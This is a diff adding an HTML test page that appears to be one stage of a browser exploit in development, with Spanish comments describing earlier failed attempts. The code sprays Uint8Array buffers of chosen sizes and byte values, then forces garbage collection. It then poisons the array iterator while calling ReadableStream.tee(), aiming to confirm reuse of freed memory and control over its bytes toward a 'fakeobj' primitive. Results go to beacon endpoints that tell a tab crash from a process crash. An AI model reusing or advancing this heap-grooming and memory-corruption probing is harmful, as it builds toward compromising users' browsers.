@@ -1,0 +1,90 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<script src="runtime-derive/derive-runtime.js"></script>
+<title>FA-v27-u8seed — press-18: escalera carrier×contenido con Uint8Array (bytes 100% nuestros)</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}else if(u&&location.href.indexOf(u)===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v27-u8seed…</pre>
+<script>
+(function(){
+"use strict";
+/* FA-v27-u8seed — press-18 (escalera adaptativa 2×2: carrier × contenido).
+ * Lección del press-17: seed con STRINGS falló (el header del StringImpl
+ * NUNCA es cero — envenena el slot). Uint8Array backing store = bytes puros.
+ * Escalera (cada rung: seed → DROP → presión GC → throw-at-1):
+ *   R1: U8(16)  ceros  ×8192  (carrier tamaño vector 2×JSValue)
+ *   R2: U8(128) ceros  ×4096  (carrier tamaño string-class)
+ *   R3: U8(16)  0x41   ×8192  (contraste no-cero)
+ *   R4: U8(128) 0x41   ×4096
+ * Sobrevive-ceros + muere-0x41 en la MISMA clase = reciclaje + control
+ * de bytes CONFIRMADO → el fakeobj pasa a ser ejercicio de sembrar.
+ * GC sin gc(): presión por junk. Worker PRIMERO. Kit incluido. */
+var RID="v27u"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/V27-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("HB","main-hb");},2000);
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+bk("L","v27-u8seed; dr="+dr+"; rt="+rt+"; W="+(typeof Worker));
+
+var wkSpawn="-";
+try{
+  var wsrc =
+    "try{fetch('/beacon/V27-W1',{method:'POST',body:JSON.stringify({b:'worker vivo; RBC='+(typeof ReadableByteStreamController)})}).catch(function(){});}catch(e){}\n"+
+    "setInterval(function(){try{fetch('/beacon/V27-WKHB?x='+Date.now(),{method:'POST',body:'{}'}).catch(function(){});}catch(e){}},2000);\n"+
+    "setTimeout(function(){try{fetch('/beacon/V27-WKZ',{method:'POST',body:JSON.stringify({b:'worker vivo a 14s'})}).catch(function(){});}catch(e){}},14000);\n";
+  var w=new Worker(URL.createObjectURL(new Blob([wsrc],{type:"text/javascript"})));
+  wkSpawn="ok";
+}catch(e){ wkSpawn="E:"+String((e&&e.message)||e).slice(0,40); }
+bk("WK","worker="+wkSpawn);
+
+var OI=Array.prototype[Symbol.iterator];
+function rst(){try{Array.prototype[Symbol.iterator]=OI;}catch(e){}}
+function poiThrowAt1(){ Array.prototype[Symbol.iterator]=function(){ var t=this,i=0; return { next:function(){ i++; if(i===1) return {value:t[0],done:false}; throw new Error("SEED-MARK"); }};}; }
+function poiFull(){ Array.prototype[Symbol.iterator]=function(){ var t=this,i=0; return { next:function(){ i++; if(i<=t.length) return {value:t[i-1],done:false}; throw new Error("SEED-MARK"); }};}; }
+
+function gcPressure(){ var j=[]; try{ for(var i=0;i<3000;i++){ j.push(new Array(128).join("j")+i); } }catch(e){} return j.length; }
+
+function rung(size, byte, n){
+  var seed=[];
+  try{ for(var i=0;i<n;i++){ var a=new Uint8Array(size); a.fill(byte); seed.push(a); } }catch(e){}
+  seed=null; /* DROP — reciclables */
+  var gp=gcPressure();
+  var r="-";
+  try{ poiThrowAt1(); new ReadableStream({}).tee(); r="SURVIVIO"; rst(); }
+  catch(e){ rst(); r="threw:"+String((e&&e.message)||e).slice(0,30); }
+  return r+";gp="+gp;
+}
+
+/* S1 — control */
+bk("armed-1","control full-fill");
+var s1="-";
+try{ poiFull(); new ReadableStream({}).tee(); s1="no-throw"; rst(); }
+catch(e){ rst(); s1="threw:"+String((e&&e.message)||e).slice(0,30); }
+bk("S1",s1);
+
+/* FILAS LETALES RETRASADAS 4s: el worker bootea y beaconea 2× ANTES
+ * del kill → WKHB-vivo-tras-kill = VM-local · WKHB-muerto = proceso */
+setTimeout(function(){
+
+/* R1 — U8(16) ceros */
+bk("armed-R1","U8(16) ceros x8192 + drop + presion + throw-at-1");
+bk("R1",rung(16,0,8192));
+
+/* R2 — U8(128) ceros */
+bk("armed-R2","U8(128) ceros x4096 + drop + presion + throw-at-1");
+bk("R2",rung(128,0,4096));
+
+/* R3 — U8(16) 0x41 (contraste) */
+bk("armed-R3","U8(16) 0x41 x8192 — si no hay R3, murio aqui");
+bk("R3",rung(16,0x41,8192));
+
+/* R4 — U8(128) 0x41 (contraste) */
+bk("armed-R4","U8(128) 0x41 x4096 — si no hay R4, murio aqui");
+bk("R4",rung(128,0x41,4096));
+
+rst();
+clearInterval(HB);
+bk("Z","FA-v27-u8seed complete — main VIVA en las 4 filas");
+},4000); /* fin del retraso letal */
+})();
+</script></body></html>
